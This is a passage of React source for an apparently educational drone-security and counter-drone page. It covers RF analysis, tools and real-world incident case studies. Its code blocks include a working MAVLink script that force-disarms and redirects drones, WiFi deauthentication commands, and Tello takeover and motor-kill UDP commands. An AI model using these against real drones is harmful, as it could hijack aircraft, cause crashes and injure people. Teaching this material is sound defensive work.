                        Signal Analysis & Exploitation
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`Drone RF Signal Analysis
════════════════════════════════════════════════════════════

Analysis Workflow:
1. Capture    → Record IQ samples at drone frequencies
2. Identify   → Determine modulation, protocol, hopping pattern
3. Decode     → Extract control commands, telemetry
4. Analyze    → Find vulnerabilities, reverse engineer
5. Exploit    → Jam, spoof, or inject commands

# Capture 2.4 GHz band with HackRF
hackrf_transfer -r capture.cs8 -f 2420000000 -s 20000000 -g 40

# Analyze with inspectrum
inspectrum capture.cs8

# Look for:
# - Bandwidth: Narrow (RC) vs Wide (WiFi/FHSS)
# - Periodicity: Control packets typically 50-250 Hz
# - Hopping: FHSS shows frequency jumps in waterfall
# - Modulation: GFSK, OFDM, etc.

Common Drone RF Protocols:
┌──────────────────┬────────────┬──────────────────────────┐
│ Protocol         │ Frequency  │ Security                 │
├──────────────────┼────────────┼──────────────────────────┤
│ FrSky ACCST      │ 2.4 GHz    │ FHSS, basic auth         │
│ Spektrum DSMX    │ 2.4 GHz    │ FHSS, binding code       │
│ Flysky AFHDS     │ 2.4 GHz    │ FHSS, weak               │
│ ExpressLRS       │ 2.4/900MHz │ Open source, FHSS        │
│ TBS Crossfire    │ 900 MHz    │ Proprietary, encrypted   │
│ DJI OcuSync      │ 2.4/5.8GHz │ Encrypted, FHSS          │
└──────────────────┴────────────┴──────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* Cyber Attacks Section */}
              <Box id="cyber-attacks" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <BugReportIcon /> Cyber Attacks
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Cyber attacks against drones exploit vulnerabilities in their software, protocols, and network 
                    interfaces. Unlike RF jamming which is a brute-force approach, cyber attacks can provide precise 
                    control over a drone or extract sensitive information from it.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Software vulnerabilities in drones:</strong> Drones are essentially flying computers, and like 
                    all computers, they have software vulnerabilities. The flight controller firmware may have bugs that 
                    can be exploited. The communication protocols may lack proper authentication or encryption. Web 
                    interfaces for configuration may be vulnerable to injection attacks. Even the mobile apps used to 
                    control drones can have security flaws that affect the entire system.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Protocol exploitation:</strong> Open protocols like MAVLink were designed for flexibility 
                    and ease of use, not security. By default, MAVLink has no authentication—any device that can send 
                    properly formatted packets can control the drone. This makes protocol-level attacks extremely effective 
                    against unprotected systems. An attacker who gains network access (via WiFi or telemetry link) can 
                    send commands to disarm motors, change flight modes, or redirect the drone to different coordinates.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>Learning drone cyber security:</strong> Start by setting up a test environment with open-source 
                    flight controllers like ArduPilot or PX4 running in simulation. Learn to use tools like MAVProxy and 
                    pymavlink to interact with the drone's protocol layer. Analyze network traffic with Wireshark to 
                    understand what commands look like. This hands-on experience with legitimate systems will give you 
                    the foundation to identify and responsibly disclose vulnerabilities in real-world systems.
                  </Typography>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        MAVLink Injection Attacks
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`MAVLink Command Injection
════════════════════════════════════════════════════════════

# MAVLink has no authentication by default!
# If you can reach the telemetry port, you can send commands

from pymavlink import mavutil

# Connect to drone (assuming network access)
mav = mavutil.mavlink_connection('udp:drone_ip:14550')

# Wait for heartbeat
mav.wait_heartbeat()
print(f"Target: System {mav.target_system}")

# Disarm motors (emergency stop)
mav.mav.command_long_send(
    mav.target_system,
    mav.target_component,
    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
    0,  # confirmation
    0,  # 0=disarm, 1=arm
    21196,  # force disarm magic number
    0, 0, 0, 0, 0
)

# Change flight mode to LAND
mav.set_mode('LAND')

# Set home location (affects RTH)
mav.mav.command_long_send(
    mav.target_system,
    mav.target_component,
    mavutil.mavlink.MAV_CMD_DO_SET_HOME,
    0,
    1,  # use specified location
    0, 0, 0,
    attacker_lat,  # New "home" location
    attacker_lon,
    attacker_alt
)

# Navigate to location
mav.mav.mission_item_send(
    mav.target_system,
    mav.target_component,
    0,  # sequence
    mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
    mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
    2,  # current
    1,  # autocontinue
    0, 0, 0, 0,
    target_lat, target_lon, target_alt
)`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        WiFi Drone Attacks
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`WiFi Drone Attack Techniques
════════════════════════════════════════════════════════════

# 1. Reconnaissance - Find drone WiFi networks
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon

# Look for SSIDs like:
# - "Phantom-XXXXXX"
# - "TELLO-XXXXXX"
# - "ardrone2_XXXXXX"

# 2. Deauthentication Attack
sudo aireplay-ng -0 10 -a <DRONE_BSSID> -c <CONTROLLER_MAC> wlan0mon

# 3. Connect to Drone AP (if open or after deauth)
nmcli device wifi connect "TELLO-XXXXXX"

# 4. Tello Drone Example (UDP commands)
import socket

tello = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
tello.bind(('', 8889))

# Enter SDK mode
tello.sendto(b'command', ('192.168.10.1', 8889))

# Take control
tello.sendto(b'takeoff', ('192.168.10.1', 8889))
tello.sendto(b'land', ('192.168.10.1', 8889))
tello.sendto(b'emergency', ('192.168.10.1', 8889))  # Kill motors

# 5. Video Stream Interception
# Many drones send unencrypted video
ffplay udp://192.168.10.1:11111  # Tello video stream
ffplay rtsp://192.168.1.1/live   # Some other drones`}
                      />
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* Tools Section */}
              <Box id="tools" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <BuildIcon /> Tools & Equipment
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    The right tools are essential for effective drone security research. Fortunately, many powerful 
                    tools are available at reasonable prices, and open-source software provides professional-grade 
                    capabilities for those willing to learn.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Building your toolkit:</strong> Start with receive-only equipment like an RTL-SDR dongle 
                    (about $30), which lets you monitor drone frequencies without any legal risk from transmitting. 
                    Add software tools like GNU Radio for signal processing, Wireshark for protocol analysis, and 
                    QGroundControl for MAVLink interaction. As you advance, consider a HackRF or similar transceiver 
                    for controlled transmission experiments in legal environments.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Test platforms:</strong> Having your own drone for testing is invaluable. Inexpensive options 
                    like the Tello ($100) provide WiFi-based control that's easy to analyze. For more serious research, 
                    build or buy a drone running open-source firmware like ArduPilot or PX4, which you can fully inspect 
                    and modify. Simulation software like Gazebo or AirSim lets you test attack scenarios safely without 
                    risking real equipment.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>The learning curve:</strong> Each tool has its own learning curve. Start simple—get comfortable 
                    with basic RF reception before diving into complex signal processing. Learn one protocol (like MAVLink) 
                    thoroughly before trying to analyze proprietary ones. The table below provides an overview of 
                    commonly-used tools, their costs, and primary use cases to help you plan your toolkit.
                  </Typography>

                  <TableContainer component={Paper} sx={{ bgcolor: theme.bgNested, mb: 3 }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Tool</TableCell>
                          <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Type</TableCell>
                          <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Cost</TableCell>
                          <TableCell sx={{ color: theme.primary, fontWeight: 600 }}>Use Case</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          { tool: "RTL-SDR v3", type: "SDR Receiver", cost: "$30", use: "RF detection, analysis" },
                          { tool: "HackRF One", type: "SDR TX/RX", cost: "$350", use: "GPS spoofing research, TX" },
                          { tool: "WiFi Pineapple", type: "WiFi Tool", cost: "$200", use: "WiFi drone attacks" },
                          { tool: "DroneID Receiver", type: "Detection", cost: "$50-500", use: "Remote ID monitoring" },
                          { tool: "QGroundControl", type: "Software", cost: "Free", use: "MAVLink interface" },
                          { tool: "Wireshark", type: "Software", cost: "Free", use: "Protocol analysis" },
                          { tool: "GNU Radio", type: "Software", cost: "Free", use: "RF signal processing" },
                          { tool: "Aircrack-ng", type: "Software", cost: "Free", use: "WiFi attacks" },
                        ].map((row, idx) => (
                          <TableRow key={idx}>
                            <TableCell sx={{ color: theme.secondary, fontWeight: 500 }}>{row.tool}</TableCell>
                            <TableCell sx={{ color: theme.text }}>{row.type}</TableCell>
                            <TableCell sx={{ color: theme.accent }}>{row.cost}</TableCell>
                            <TableCell sx={{ color: theme.textMuted }}>{row.use}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </Paper>
              </Box>

              {/* Case Studies */}
              <Box id="case-studies" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <HistoryEduIcon /> Real-World Case Studies
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Real-world incidents provide invaluable lessons about drone security threats and defenses. By studying 
                    what has actually happened—from airport disruptions to military drone captures to academic research 
                    demonstrations—we can better understand both the capabilities and limitations of drone technology and 
                    counter-drone systems.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Learning from incidents:</strong> Each case study below represents a different aspect of drone 
                    security. Some show how unprepared organizations were for drone threats. Others demonstrate specific 
                    attack techniques like GPS spoofing. And research demonstrations like SkyJack show how security 
                    researchers identify and publicize vulnerabilities to drive improvements in drone security.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>Analyzing case studies:</strong> When studying these incidents, ask yourself: What made the 
                    attack possible? What defenses were in place (if any)? How was the incident detected and resolved? 
                    What changes resulted from the incident? This analytical approach helps you develop the mindset needed 
                    for effective security work.
                  </Typography>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Gatwick Airport Drone Incident (2018)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Alert severity="info" sx={{ mb: 2, bgcolor: alpha(theme.info, 0.1), color: theme.text }}>
                        <Typography variant="body2">
                          One of the most significant drone disruption incidents in aviation history.
                        </Typography>
                      </Alert>
                      <CodeBlock
                        code={`Gatwick Airport Incident Analysis
════════════════════════════════════════════════════════════

TIMELINE:
├── Dec 19, 2018 21:03 - First drone sighting reported
├── Dec 19, 2018 21:38 - Runway closed
├── Dec 20, 2018 03:01 - Runway reopened briefly
├── Dec 20, 2018 - Multiple closures throughout day
├── Dec 21, 2018 06:00 - Military deployed (Israeli tech)
└── Dec 21, 2018 - Operations resume with military support

IMPACT:
┌─────────────────────────────────────────────────────────────┐
│ • ~1,000 flights cancelled                                  │
│ • ~140,000 passengers disrupted                             │
│ • 36 hours of disruption total                              │
│ • Estimated cost: £50+ million                              │
│ • Global media coverage                                     │
└─────────────────────────────────────────────────────────────┘

RESPONSE CHALLENGES:
├── No C-UAS systems in place at airport
├── Difficulty confirming sightings (67 reports, many dubious)
├── Legal barriers to shooting/jamming
├── Police unable to locate operators
├── Military deployment took ~24 hours

AFTERMATH:
├── UK invested £5M+ in airport C-UAS
├── Drone exclusion zones expanded
├── New laws: 5 years imprisonment for airport drone incursion
├── Airports worldwide reviewed C-UAS capabilities
├── DroneShield, Dedrone saw massive sales increase

PERPETRATORS:
└── Never conclusively identified (case remains open)`}
                      />
                      <List dense>
                        {[
                          "Duration: 3 days (Dec 19-21, 2018)",
                          "Impact: ~1,000 flights cancelled, 140,000 passengers affected",
                          "Response: Military deployed, airspace closed",
                          "Detection: Difficult - multiple reported sightings",
                          "Resolution: Perpetrators never conclusively identified",
                          "Aftermath: UK expanded C-UAS capabilities at airports",
                        ].map((item, idx) => (
                          <ListItem key={idx} sx={{ py: 0.25 }}>
                            <ListItemIcon sx={{ minWidth: 24 }}>
                              <KeyboardArrowRightIcon sx={{ fontSize: 16, color: theme.info }} />
                            </ListItemIcon>
                            <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", sx: { color: theme.textMuted } }} />
                          </ListItem>
                        ))}
                      </List>
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Saudi Aramco Drone Attack (2019)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Alert severity="error" sx={{ mb: 2, bgcolor: alpha(theme.error, 0.1), color: theme.text }}>
                        <Typography variant="body2">
                          Demonstrated how drones can cause massive economic damage to critical infrastructure.
                        </Typography>
                      </Alert>
                      <CodeBlock
                        code={`Saudi Aramco Abqaiq Attack Analysis
════════════════════════════════════════════════════════════

INCIDENT SUMMARY:
├── Date: September 14, 2019
├── Target: Abqaiq oil processing facility (world's largest)
├── Secondary target: Khurais oil field
├── Attackers: Houthi rebels (Yemen) / attributed to Iran
└── Method: Coordinated drone and cruise missile strike

ATTACK COMPOSITION:
┌─────────────────────────────────────────────────────────────┐
│ • 18 drones (Samad-3 type or similar)                       │
│ • 7 cruise missiles (possibly Quds-1)                       │
│ • Total: 25 weapons in coordinated wave                     │
│ • Attack direction: North (avoiding southern air defenses)  │
│ • Flight path: ~1,000 km from Iran (disputed)               │
└─────────────────────────────────────────────────────────────┘

DAMAGE & IMPACT:
├── 5.7 million barrels/day production halted (5% global)
├── 17 impact points on facility
├── Oil prices spiked 15% (largest single-day jump in decades)
├── Full production restored in ~10 days
└── Estimated damage: Billions of dollars

AIR DEFENSE FAILURES:
┌─────────────────────────────────────────────────────────────┐
│ Saudi Arabia had extensive air defenses:                    │
│ ├── Patriot PAC-2/PAC-3 batteries                           │
│ ├── Shahine short-range systems                             │
│ └── Yet attack succeeded - why?                             │
│                                                             │
│ Analysis:                                                   │
│ ├── Systems oriented south toward Yemen                     │
│ ├── Low-flying drones below radar coverage                  │
│ ├── Cruise missiles difficult to detect (small RCS)         │
│ ├── Possible radar gaps exploited                           │
│ └── No C-UAS specifically for small drone threats           │
└─────────────────────────────────────────────────────────────┘

LESSONS LEARNED:
├── Traditional air defense ≠ C-UAS capability
├── Low-cost drones can cause billion-dollar damage
├── Critical infrastructure needs dedicated C-UAS
├── 360° coverage essential (not just likely threat axis)
└── Coordinated attacks can saturate defenses`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Iran RQ-170 Capture (2011)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                        Iran claimed to have captured a US RQ-170 Sentinel drone using GPS spoofing.
                      </Typography>
                      <CodeBlock
                        code={`RQ-170 Sentinel Capture Analysis
════════════════════════════════════════════════════════════

INCIDENT:
├── Date: December 4, 2011
├── Location: Kashmar, Iran (near Afghan border)
├── Aircraft: Lockheed Martin RQ-170 Sentinel
├── Mission: Classified reconnaissance (likely Iran nuclear)
└── Outcome: Drone captured largely intact

IRANIAN CLAIMS (Disputed):
┌─────────────────────────────────────────────────────────────┐
│ 1. Detected drone entering Iranian airspace                 │
│ 2. Jammed control link (drone entered autopilot)            │
│ 3. Spoofed GPS to provide false position data               │
│ 4. Drone "thought" it was landing at home base              │
│ 5. Actually landed at Iranian-controlled location           │
│                                                             │
│ Technical plausibility:                                     │
│ ├── GPS spoofing is technically feasible                    │
│ ├── Civilian GPS signals are unencrypted                    │
│ ├── However, military drones likely use encrypted GPS       │
│ └── More likely: malfunction + manual landing by Iran       │
└─────────────────────────────────────────────────────────────┘

US RESPONSE:
├── Initially denied it was US drone
├── Later confirmed loss, requested return (denied)
├── President Obama considered recovery mission (rejected)
└── RQ-170 technology potentially compromised

AFTERMATH:
├── Iran reverse-engineered and produced copies (claimed)
├── Increased focus on anti-spoofing for military drones
├── Highlighted vulnerability of GPS-dependent systems
├── China reportedly received access to examine drone
└── Led to development of more autonomous, GPS-independent UAVs`}
                      />
                      <List dense>
                        {[
                          "Target: Lockheed Martin RQ-170 Sentinel (classified drone)",
                          "Method: Allegedly GPS spoofing to manipulate navigation",
                          "Result: Drone landed mostly intact in Iran",
                          "Debate: Method disputed - may have been signal loss + autopilot",
                          "Impact: Highlighted GPS vulnerability in military systems",
                        ].map((item, idx) => (
                          <ListItem key={idx} sx={{ py: 0.25 }}>
                            <ListItemIcon sx={{ minWidth: 24 }}>
                              <KeyboardArrowRightIcon sx={{ fontSize: 16, color: theme.warning }} />
                            </ListItemIcon>
                            <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", sx: { color: theme.textMuted } }} />
                          </ListItem>
                        ))}
                      </List>
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Venezuelan Presidential Drone Attack (2018)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Alert severity="error" sx={{ mb: 2, bgcolor: alpha(theme.error, 0.1), color: theme.text }}>
                        <Typography variant="body2">
                          First known drone assassination attempt against a head of state.
                        </Typography>
                      </Alert>
                      <CodeBlock
                        code={`Venezuelan Drone Attack Analysis
════════════════════════════════════════════════════════════

INCIDENT:
├── Date: August 4, 2018
├── Location: Caracas, Venezuela
├── Target: President Nicolás Maduro during military parade
├── Method: Explosive-laden DJI M600 drones
└── Outcome: Failed - president unharmed, 7 soldiers injured

ATTACK DETAILS:
┌─────────────────────────────────────────────────────────────┐
│ • Two DJI M600 hexacopters used                             │
│ • Each carrying ~1 kg C-4 explosive                         │
│ • Drones approached parade reviewing stand                  │
│ • First drone: Shot down / jammed (conflicting reports)     │
│ • Second drone: Lost control, crashed into apartment        │
│ • Both detonated but missed intended target                 │
└─────────────────────────────────────────────────────────────┘

WHY IT FAILED:
├── Possible jamming by presidential security
├── Drones may have been shot down
├── Operator error / premature detonation
├── Counter-measures (unconfirmed)
└── Distance miscalculation

SECURITY IMPLICATIONS:
├── Demonstrated VIP assassination threat from drones
├── Commercial drones easily weaponized
├── Highlighted need for event/VIP C-UAS
├── Traditional security (snipers, barriers) inadequate
└── Prompted C-UAS investment by governments worldwide

AFTERMATH:
├── Venezuela claimed US/Colombia involvement
├── Multiple arrests made
├── Increased global awareness of drone terrorism threat
├── Many countries began VIP drone protection programs
└── DJI added Caracas to geofenced zones`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Prison Drone Smuggling (Ongoing)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`Prison Drone Smuggling Analysis
════════════════════════════════════════════════════════════

SCALE OF PROBLEM:
┌─────────────────────────────────────────────────────────────┐
│ UK (2023 statistics):                                       │
│ ├── 1,200+ drone incidents at prisons                       │
│ ├── Drugs most common payload                               │
│ └── Phones, weapons also smuggled                           │
│                                                             │
│ US (various reports):                                       │
│ ├── Hundreds of incidents annually                          │
│ ├── Growing problem at federal and state facilities         │
│ └── South Carolina: Drone dropped gun inside prison (2017)  │
└─────────────────────────────────────────────────────────────┘

TYPICAL OPERATION:
1. Coordinate with inmate via smuggled phone
2. Load drone with contraband (drugs, phones)
3. Fly at night to predetermined yard location
4. Inmate retrieves package
5. Drone returns to operator outside perimeter

PAYLOAD EXAMPLES:
├── Drugs: Heroin, methamphetamine, marijuana, synthetic drugs
├── Cell phones: Hundreds per incident possible with drops
├── Weapons: Knives, guns (yes, small firearms)
├── Tobacco: High value in smoke-free facilities
└── Electronics: Memory cards, USB drives

C-UAS RESPONSES:
┌─────────────────────────────────────────────────────────────┐
│ Detection:                                                  │
│ ├── RF sensors to detect drone control signals              │
│ ├── Radar for larger facilities                             │
│ └── Acoustic detection for quiet approaches                 │
│                                                             │
│ Defeat:                                                     │
│ ├── Jamming (legal for federal prisons in US)               │
│ ├── D-Fend cyber-takeover (controlled landing)              │
│ ├── Netting systems                                         │
│ └── Geofencing (limited effectiveness)                      │
└─────────────────────────────────────────────────────────────┘

NOTABLE INCIDENT:
├── HMP Pentonville, UK (2016)
├── Drone delivered drugs worth £1 million
├── Operator caught, sentenced to 32 months
└── Led to UK prison drone legislation`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        Austin GPS Spoofing Research (2012)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                        University of Texas researchers demonstrated GPS spoofing against drones and ships, 
                        influencing policy and spurring defensive research.
                      </Typography>
                      <CodeBlock
                        code={`UT Austin GPS Spoofing Research
════════════════════════════════════════════════════════════

RESEARCH TEAM:
├── Leader: Prof. Todd Humphreys, UT Austin
├── Radionavigation Laboratory
└── DHS-funded research program

KEY DEMONSTRATIONS:

2012 - Drone Spoofing:
┌─────────────────────────────────────────────────────────────┐
│ • Target: University drone (with permission)                │
│ • Equipment: Custom GPS spoofer (~$1,000 in parts)          │
│ • Result: Successfully took control of drone navigation     │
│ • Drone "thought" it was gaining altitude when descending   │
│ • Demonstrated seamless GPS takeover technique              │
└─────────────────────────────────────────────────────────────┘

2013 - Ship Spoofing (White Rose of Drachs):
┌─────────────────────────────────────────────────────────────┐
│ • Target: 65-meter luxury yacht                             │
│ • Location: Mediterranean Sea                               │
│ • Method: Gradually shifted GPS position                    │
│ • Result: Ship deviated from course without crew noticing   │
│ • Implications: Maritime navigation vulnerable              │
└─────────────────────────────────────────────────────────────┘

TECHNICAL APPROACH:
├── Seamless takeover: Match real GPS signal first
├── Gradual deviation: Avoid sudden jumps that trigger alarms
├── Phase alignment: Complex but achievable with SDR
└── Portable equipment: Briefcase-sized spoofer

POLICY IMPACT:
├── Congressional testimony on drone vulnerabilities
├── FAA drone integration concerns heightened
├── DHS increased GPS security research funding
├── Led to anti-spoofing receiver development
├── Influenced military GPS modernization (M-code)
└── Academic foundation for C-UAS spoofing research`}
                      />
                    </AccordionDetails>
                  </Accordion>

                  <Accordion sx={{ bgcolor: theme.bgNested }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        SkyJack Research (2013)
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                        Samy Kamkar demonstrated autonomous drone hijacking at scale.
                      </Typography>
                      <CodeBlock
                        code={`SkyJack Concept:
════════════════════════════════════════════════════════════

Attack Chain:
1. Attacker drone flies with Raspberry Pi + WiFi adapter
2. Scans for Parrot AR.Drone WiFi networks
3. Sends deauthentication to disconnect operator
4. Connects to drone's open WiFi AP
5. Sends control commands via UDP
6. Drone is now under attacker's control

Components Used:
├── Parrot AR.Drone (carrier platform)
├── Raspberry Pi
├── Alfa AWUS036H WiFi adapter
├── aircrack-ng suite
└── Custom Node.js control software

Impact:
• Demonstrated mass drone hijacking feasibility
• Highlighted WiFi drone vulnerabilities
• Led to improved security in later drone models
• Inspired further security research

Technical Details:
┌─────────────────────────────────────────────────────────────┐
│ # SkyJack attack flow:                                      │
│ 1. airmon-ng start wlan0                                    │
│ 2. Scan for "ardrone" SSIDs                                 │
│ 3. aireplay-ng -0 1 -a <target> wlan0mon                    │
│ 4. Connect to drone AP (no password)                        │
│ 5. Send UDP commands to 192.168.1.1:5556                    │
│                                                             │
│ Drone control packet structure:                             │
│ AT*REF=<seq>,290718208 (takeoff)                            │
│ AT*REF=<seq>,290717696 (land)                               │
│ AT*PCMD=<seq>,1,<roll>,<pitch>,<gaz>,<yaw>                  │
└─────────────────────────────────────────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>
                </Paper>
              </Box>

              {/* Open Source Projects Section */}
              <Box id="open-source" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <MemoryIcon /> Open Source C-UAS Projects
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    The open source community has produced remarkable tools for drone detection, protocol analysis, 
                    and security research. These projects range from simple SDR-based receivers to sophisticated 
                    machine learning detection systems. They provide invaluable learning resources and can serve 
                    as the foundation for more advanced research.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Benefits of open source:</strong> Open source C-UAS tools allow researchers to understand 
                    exactly how detection and analysis work, modify them for specific needs, and contribute improvements 
                    back to the community. They're also excellent learning resources—you can study the code to understand 
                    RF signal processing, protocol parsing, and machine learning classification techniques.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
                    <strong>A word of caution:</strong> While these tools are invaluable for research and education, 
                    using them inappropriately can be illegal. Always ensure you have proper authorization before 
                    monitoring drone communications or conducting any active testing. Many of these tools are 
                    receive-only and legal for passive monitoring, but some include transmission capabilities that 
                    may require licensing or authorization.
                  </Typography>

                  <Accordion sx={{ bgcolor: theme.bgNested, mb: 2 }}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.text }} />}>
                      <Typography sx={{ color: theme.secondary, fontWeight: 600 }}>
                        DroneID / Remote ID Receivers
                      </Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                      <CodeBlock
                        code={`Open Source Remote ID Projects
════════════════════════════════════════════════════════════

OPENDRONEID (ASTM/FAA Compliant):
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/opendroneid                          │
│                                                             │
│ Components:                                                 │
│ ├── opendroneid-core-c: C library for encoding/decoding     │
│ ├── receiver-android: Android app for Remote ID reception   │
│ ├── receiver-esp32: ESP32-based hardware receiver           │
│ └── transmitter-linux: Test transmitter for development     │
│                                                             │
│ Capabilities:                                               │
│ ├── Decode WiFi Beacon Remote ID                            │
│ ├── Decode WiFi NAN Remote ID                               │
│ ├── Decode Bluetooth Remote ID                              │
│ ├── Display UAS ID, location, operator location             │
│ └── Log historical data                                     │
│                                                             │
│ Hardware: ESP32 (~$5) + smartphone                          │
└─────────────────────────────────────────────────────────────┘

# ESP32 OpenDroneID Receiver Setup:
git clone https://github.com/opendroneid/receiver-android
# Flash ESP32 with opendroneid-esp32 firmware
# Pair with Android app via Bluetooth
# Monitor nearby drone Remote ID broadcasts

DJI AEROSCOPE DECODER (Unofficial):
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/davidgfnet/dji-aeroscope-decoder     │
│                                                             │
│ Purpose: Decode DJI's proprietary AeroScope protocol        │
│                                                             │
│ What it extracts:                                           │
│ ├── Drone serial number                                     │
│ ├── Drone GPS coordinates                                   │
│ ├── Pilot/controller GPS coordinates                        │
│ ├── Drone model identification                              │
│ └── Flight telemetry                                        │
│                                                             │
│ Hardware: HackRF or RTL-SDR + GNU Radio                     │
│                                                             │
│ Note: DJI changed protocol in newer firmware                │
└─────────────────────────────────────────────────────────────┘

DRONE-ID (Research Project):
┌─────────────────────────────────────────────────────────────┐
│ Repository: github.com/dronesecurity/drone-id               │
│                                                             │
│ Capabilities:                                               │
│ ├── WiFi-based drone detection                              │
│ ├── DJI protocol analysis                                   │
│ ├── FPV protocol analysis                                   │
│ └── Research-focused documentation                          │
└─────────────────────────────────────────────────────────────┘`}
                      />
                    </AccordionDetails>
                  </Accordion>

